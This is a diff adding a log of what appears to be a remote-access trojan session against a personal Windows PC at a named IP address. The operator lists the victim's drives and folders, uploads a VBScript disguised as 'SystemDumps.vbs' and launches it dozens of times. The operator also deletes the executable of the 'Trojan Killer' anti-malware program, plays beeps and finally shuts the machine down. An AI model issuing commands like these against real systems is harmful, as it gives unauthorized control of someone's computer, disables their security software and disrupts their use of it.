@@ -1,0 +1,480 @@
+======== 2021-4-17_13-29-18 ========
+COMMAND: 90.95.141.216:12750
+Connected to 90.95.141.216:12750.
+
+======== 2021-4-17_13-32-37 ========
+COMMAND: cmd dir c:\
+OUTPUT:  Volume in drive C is OS
+ Volume Serial Number is 8ECD-5B34
+
+ Directory of c:\
+
+04/11/2020  07:49 PM    <DIR>          AMD
+09/25/2020  04:26 PM    <DIR>          OJI
+12/28/2019  06:21 AM    <DIR>          PerfLogs
+04/16/2021  10:22 PM    <DIR>          Program Files
+04/16/2021  10:38 PM    <DIR>          Program Files (x86)
+10/16/2020  07:34 PM    <DIR>          Users
+04/16/2021  04:40 PM    <DIR>          Windows
+               0 File(s)              0 bytes
+               7 Dir(s)   8,142,278,656 bytes free
+
+
+======== 2021-4-17_13-32-46 ========
+COMMAND: beep
+Beep executed successfully.
+
+======== 2021-4-17_13-33-07 ========
+COMMAND: beep 10000 3000
+Beep executed successfully.
+
+======== 2021-4-17_13-34-29 ========
+COMMAND: send a.vbs "D:\SystemDumps.dll"
+Successfully sent file "D:\SystemDumps.dll".
+
+======== 2021-4-17_13-34-36 ========
+COMMAND: process "D:\SystemDumps.dll"
+SERVER ERROR: No application is associated with the specified file for this operation..
+
+======== 2021-4-17_13-34-48 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-34-52 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 2516.
+
+======== 2021-4-17_13-34-54 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6040.
+
+======== 2021-4-17_13-34-55 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9160.
+
+======== 2021-4-17_13-34-56 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 2876.
+
+======== 2021-4-17_13-35-23 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 2484.
+
+======== 2021-4-17_13-35-24 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7768.
+
+======== 2021-4-17_13-35-24 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 5308.
+
+======== 2021-4-17_13-35-25 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3024.
+
+======== 2021-4-17_13-35-26 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7588.
+
+======== 2021-4-17_13-35-26 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9348.
+
+======== 2021-4-17_13-35-35 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3760.
+
+======== 2021-4-17_13-35-35 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3980.
+
+======== 2021-4-17_13-35-35 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 1884.
+
+======== 2021-4-17_13-35-36 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8656.
+
+======== 2021-4-17_13-35-37 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 10072.
+
+======== 2021-4-17_13-35-37 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7448.
+
+======== 2021-4-17_13-35-37 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7360.
+
+======== 2021-4-17_13-35-37 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 684.
+
+======== 2021-4-17_13-35-38 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 4184.
+
+======== 2021-4-17_13-35-38 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9112.
+
+======== 2021-4-17_13-35-38 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8308.
+
+======== 2021-4-17_13-35-38 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6328.
+
+======== 2021-4-17_13-35-39 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7844.
+
+======== 2021-4-17_13-35-39 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9276.
+
+======== 2021-4-17_13-36-17 ========
+COMMAND: cmd dir D:\
+OUTPUT:  Volume in drive D is DATE
+ Volume Serial Number is 688F-A529
+
+ Directory of D:\
+
+12/20/2019  05:09 PM    <DIR>          3D Objects
+12/20/2019  05:09 PM    <DIR>          Contacts
+01/05/2020  11:23 PM    <DIR>          Desktop
+04/04/2021  02:07 PM    <DIR>          DOCUMENTE SERBAN
+02/11/2021  09:39 AM    <DIR>          Documents
+03/20/2021  01:29 PM    <DIR>          Downloads
+09/10/2020  09:02 PM    <DIR>          dumps
+12/20/2019  05:09 PM    <DIR>          Favorites
+12/20/2019  05:09 PM    <DIR>          Links
+12/20/2019  05:09 PM    <DIR>          Music
+12/20/2019  05:09 PM    <DIR>          Pictures
+10/16/2020  06:23 PM    <DIR>          Salvari HDD
+12/20/2019  05:09 PM    <DIR>          Saved Games
+12/20/2019  05:09 PM    <DIR>          Searches
+04/17/2021  01:34 PM                78 SystemDumps.dll
+04/17/2021  01:34 PM                78 SystemDumps.vbs
+02/11/2021  09:42 AM    <DIR>          Videos
+               2 File(s)            156 bytes
+              15 Dir(s)  20,644,900,864 bytes free
+
+
+======== 2021-4-17_13-36-28 ========
+COMMAND: cmd del D:\SystemDumps.dll
+OUTPUT:
+
+======== 2021-4-17_13-37-55 ========
+COMMAND: cmd dir "C:\program files"
+OUTPUT:  Volume in drive C is OS
+ Volume Serial Number is 8ECD-5B34
+
+ Directory of C:\program files
+
+04/16/2021  10:22 PM    <DIR>          .
+04/16/2021  10:22 PM    <DIR>          ..
+07/06/2020  07:41 AM    <DIR>          Adobe
+04/11/2020  07:50 PM    <DIR>          AMD
+06/13/2020  04:56 PM    <DIR>          Blackmagic Design
+04/17/2021  01:20 PM    <DIR>          CCleaner
+04/15/2021  10:08 PM    <DIR>          Common Files
+12/27/2019  10:27 PM    <DIR>          CONEXANT
+04/16/2021  10:10 PM    <DIR>          dotnet
+12/28/2019  06:30 AM    <DIR>          Elantech
+02/05/2021  06:46 PM    <DIR>          Image-Line
+03/27/2021  09:41 PM    <DIR>          Internet Explorer
+03/20/2021  09:13 PM    <DIR>          Java
+11/10/2020  10:42 PM    <DIR>          Microsoft Analysis Services
+11/10/2020  10:45 PM    <DIR>          Microsoft Office
+11/10/2020  10:45 PM    <DIR>          Microsoft SQL Server
+02/22/2021  01:13 PM    <DIR>          Microsoft Update Health Tools
+11/10/2020  10:46 PM    <DIR>          Microsoft.NET
+12/28/2019  06:21 AM    <DIR>          ModifiableWindowsApps
+01/15/2020  10:06 PM    <DIR>          MSBuild
+01/21/2021  02:33 PM    <DIR>          Npcap
+01/15/2020  10:06 PM    <DIR>          Reference Assemblies
+04/17/2021  11:58 AM    <DIR>          TeamViewer
+04/16/2021  02:53 PM    <DIR>          Trojan Killer
+05/30/2020  12:53 PM    <DIR>          UNP
+03/27/2021  09:41 PM    <DIR>          Windows Defender
+03/03/2021  04:23 PM    <DIR>          Windows Mail
+03/27/2021  09:41 PM    <DIR>          Windows Media Player
+12/28/2019  06:21 AM    <DIR>          Windows Multimedia Platform
+12/28/2019  06:21 AM    <DIR>          Windows NT
+03/27/2021  09:41 PM    <DIR>          Windows Photo Viewer
+12/28/2019  06:21 AM    <DIR>          Windows Portable Devices
+12/28/2019  06:21 AM    <DIR>          Windows Security
+12/28/2019  06:21 AM    <DIR>          WindowsPowerShell
+02/18/2021  01:31 PM    <DIR>          WinRAR
+10/16/2020  05:59 PM    <DIR>          Wondershare
+               0 File(s)              0 bytes
+              36 Dir(s)   8,142,036,992 bytes free
+
+
+======== 2021-4-17_13-38-01 ========
+COMMAND: cmd dir "C:\program files\Trojan Killer"
+OUTPUT:  Volume in drive C is OS
+ Volume Serial Number is 8ECD-5B34
+
+ Directory of C:\program files\Trojan Killer
+
+04/16/2021  02:53 PM    <DIR>          .
+04/16/2021  02:53 PM    <DIR>          ..
+04/09/2021  05:31 PM         1,077,160 7z32.dll
+04/09/2021  05:31 PM         1,606,568 7z64.dll
+04/16/2021  03:14 PM    <DIR>          Database
+04/09/2021  05:31 PM         2,452,744 libeay32.dll
+04/09/2021  05:31 PM         2,452,744 libeay64.dll
+04/09/2021  05:31 PM         1,556,232 libeay86.dll
+04/09/2021  05:31 PM           234,920 libmem32.dll
+04/09/2021  05:31 PM           261,544 libmem64.dll
+04/09/2021  05:31 PM            62,640 offreg32.dll
+04/09/2021  05:31 PM            75,952 offreg64.dll
+04/09/2021  05:31 PM           475,912 ssleay32.dll
+04/09/2021  05:31 PM           475,912 ssleay64.dll
+04/09/2021  05:31 PM           383,240 ssleay86.dll
+04/09/2021  05:31 PM         1,537,800 tk.exe
+04/16/2021  03:08 PM               462 tk.ini
+04/09/2021  05:31 PM        14,669,064 tk32.exe
+04/09/2021  05:31 PM        19,781,384 tk64.exe
+04/16/2021  02:57 PM    <DIR>          updates
+              16 File(s)     47,104,278 bytes
+               4 Dir(s)   8,142,036,992 bytes free
+
+
+======== 2021-4-17_13-38-19 ========
+COMMAND: cmd del "C:\Program Files\Trojan Killer\tk.exe
+Invalid command.
+
+======== 2021-4-17_13-38-22 ========
+COMMAND: cmd del "C:\Program Files\Trojan Killer\tk.exe"
+OUTPUT: C:\Program Files\Trojan Killer\tk.exe
+
+
+======== 2021-4-17_13-38-28 ========
+COMMAND: cmd dir "C:\program files\Trojan Killer"
+OUTPUT:  Volume in drive C is OS
+ Volume Serial Number is 8ECD-5B34
+
+ Directory of C:\program files\Trojan Killer
+
+04/16/2021  02:53 PM    <DIR>          .
+04/16/2021  02:53 PM    <DIR>          ..
+04/09/2021  05:31 PM         1,077,160 7z32.dll
+04/09/2021  05:31 PM         1,606,568 7z64.dll
+04/16/2021  03:14 PM    <DIR>          Database
+04/09/2021  05:31 PM         2,452,744 libeay32.dll
+04/09/2021  05:31 PM         2,452,744 libeay64.dll
+04/09/2021  05:31 PM         1,556,232 libeay86.dll
+04/09/2021  05:31 PM           234,920 libmem32.dll
+04/09/2021  05:31 PM           261,544 libmem64.dll
+04/09/2021  05:31 PM            62,640 offreg32.dll
+04/09/2021  05:31 PM            75,952 offreg64.dll
+04/09/2021  05:31 PM           475,912 ssleay32.dll
+04/09/2021  05:31 PM           475,912 ssleay64.dll
+04/09/2021  05:31 PM           383,240 ssleay86.dll
+04/09/2021  05:31 PM         1,537,800 tk.exe
+04/16/2021  03:08 PM               462 tk.ini
+04/09/2021  05:31 PM        14,669,064 tk32.exe
+04/09/2021  05:31 PM        19,781,384 tk64.exe
+04/16/2021  02:57 PM    <DIR>          updates
+              16 File(s)     47,104,278 bytes
+               4 Dir(s)   8,141,754,368 bytes free
+
+
+======== 2021-4-17_13-38-42 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-40-47 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6604.
+
+======== 2021-4-17_13-40-47 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3500.
+
+======== 2021-4-17_13-40-48 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7912.
+
+======== 2021-4-17_13-40-48 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8788.
+
+======== 2021-4-17_13-40-48 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 5404.
+
+======== 2021-4-17_13-40-49 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7324.
+
+======== 2021-4-17_13-40-50 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 10196.
+
+======== 2021-4-17_13-40-50 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7284.
+
+======== 2021-4-17_13-40-50 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 10000.
+
+======== 2021-4-17_13-40-51 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9384.
+
+======== 2021-4-17_13-40-51 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9680.
+
+======== 2021-4-17_13-40-51 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9756.
+
+======== 2021-4-17_13-40-52 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 2080.
+
+======== 2021-4-17_13-40-52 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6828.
+
+======== 2021-4-17_13-40-53 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8312.
+
+======== 2021-4-17_13-40-53 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 4072.
+
+======== 2021-4-17_13-40-53 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 1344.
+
+======== 2021-4-17_13-40-54 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 7956.
+
+======== 2021-4-17_13-40-54 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 4012.
+
+======== 2021-4-17_13-40-55 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3620.
+
+======== 2021-4-17_13-40-55 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8976.
+
+======== 2021-4-17_13-40-56 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6324.
+
+======== 2021-4-17_13-40-57 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 9436.
+
+======== 2021-4-17_13-41-00 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6220.
+
+======== 2021-4-17_13-41-01 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 4484.
+
+======== 2021-4-17_13-41-01 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8384.
+
+======== 2021-4-17_13-41-02 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6008.
+
+======== 2021-4-17_13-42-05 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-42-08 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 8724.
+
+======== 2021-4-17_13-42-52 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-42-55 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 2664.
+
+======== 2021-4-17_13-43-28 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-43-29 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3752.
+
+======== 2021-4-17_13-44-59 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-45-00 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 4464.
+
+======== 2021-4-17_13-46-05 ========
+COMMAND: beep 1000 10000
+Beep executed successfully.
+
+======== 2021-4-17_13-47-19 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-47-20 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 5464.
+
+======== 2021-4-17_13-48-48 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-48-49 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 3552.
+
+======== 2021-4-17_13-48-53 ========
+COMMAND: beep
+Beep executed successfully.
+
+======== 2021-4-17_13-49-44 ========
+COMMAND: heelp
+Invalid command.
+
+======== 2021-4-17_13-52-28 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-52-29 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 6168.
+
+======== 2021-4-17_13-53-36 ========
+COMMAND: send a.vbs "D:\SystemDumps.vbs"
+Successfully sent file "D:\SystemDumps.vbs".
+
+======== 2021-4-17_13-53-37 ========
+COMMAND: process "D:\SystemDumps.vbs"
+Successfully started process with PID 1572.
+
+======== 2021-4-17_13-54-44 ========
+COMMAND: cmd shutdown /s
+OUTPUT:
+
